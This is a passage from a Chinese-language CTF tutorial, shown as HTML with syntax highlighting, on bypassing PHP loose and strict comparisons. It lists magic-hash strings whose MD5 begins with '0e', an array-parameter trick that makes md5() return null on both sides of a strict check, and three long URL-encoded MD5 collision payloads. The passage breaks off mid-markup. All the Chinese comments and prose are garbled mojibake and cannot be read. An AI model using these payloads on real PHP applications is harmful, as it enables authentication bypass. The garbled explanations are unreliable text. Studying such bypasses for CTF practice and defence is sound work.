class="hljs-comment">//ç§‘å­¦è®¡æ•°æ³•çš„ç›¸å…³æ¯”è¾ƒ,å¹¶æ‹“å±•åˆ°MD5åŠ å¯†æ¯”è¾ƒ</span><br><span class="hljs-number">0e333</span> == <span class="hljs-string">&#x27;0e111&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;0e321&#x27;</span>==<span class="hljs-string">&#x27;0e789&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-comment">//æ¯”å¦‚ä¸¤ä¸ªä¸œè¥¿åŠ å¯†åå‡ä»¥0eå¼€å¤´ï¼Œé‚£ä»–ä»¬å°±æ˜¯å¼±ç›¸ç­‰çš„</span><br><span class="hljs-comment">//æ‹“å±•åˆ°is_numericçš„ç»•è¿‡ï¼Œå¾ˆç»å…¸çš„æ˜¯è®©ä½ è¾“å…¥ä¸€ä¸ªä¸œè¥¿(GETæˆ–POSTä¼ ï¼Œè¿™ä¸ªä¸œè¥¿ä¸èƒ½æ˜¯æ•°å­—å´è¦å¤§äºæˆ–å°äºæˆ–ç­‰äºæŸä¸ªç‰¹å®šçš„æ•°å­—)</span><br> <span class="hljs-comment">//æ³¨æ„è™½ç„¶`0==null==false`æˆç«‹ï¼Œä½†ä¸èƒ½å› ä¸º`&#x27;notbad3333&#x27; == 0`å°±æ¨å‡º`&#x27;notbad3333&#x27; == null/false`!</span><br></code></pre></td></tr></table></figure><p>åœ¨å¼ºç›¸ç­‰ä¸­ï¼Œä¸å…‰è¦æ±‚å€¼ç›¸ç­‰ç±»å‹è¿˜è¦ç›¸ç­‰ã€‚å¦‚æœæƒ³è¦ç»•è¿‡ä¸¤ä¸ªmd5çš„å¼ºç›¸ç­‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æ•°ç»„æ³•</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;oh you find me!&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//å¯ç”¨GETä¼ ?a[]=a&amp;b[]=bï¼ŒMD5æ²¡æ³•ç»™æ•°ç»„åŠ å¯†ä¼šè¿”å›null(æŠ¥é”™)ï¼Œä½†è¿™æ—¶ä¸¤ä¸ªnullæ»¡è¶³äº†å¼ºç›¸ç­‰ã€‚</span><br><span class="hljs-comment">//ç¢°æ’æ³•:MD5è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ©ç”¨ç°æœ‰çš„MD5çš„å¼ºç¢°æ’è§£é¢˜</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„MD5å¼±æ¯”è¾ƒï¼š</span><br>QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0e462097431906509019562988736854</span><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><span class="hljs-comment">//MD5ç¡¬ç¢°æ’</span><br>a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%<span class="hljs-number">5</span>f%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%f3%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%e9%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">13</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%a8%<span class="hljs-number">1</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%<span class="hljs-number">39</span>%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;c=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%ed%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%a7%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%e6%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">16</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%<span class="hljs-number">33</span>%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%<span class="hljs-number">6</span>f%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br></code></pre></td></tr></table></figure><p>åœ¨PHPä¸­æœ‰äº›å‡½æ•°ä¼šåœ¨å†…éƒ¨â€œä½¿ç”¨â€å¼±ç›¸ç­‰ï¼Œæ¯”å¦‚switch()ã€in_array()ç­‰å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 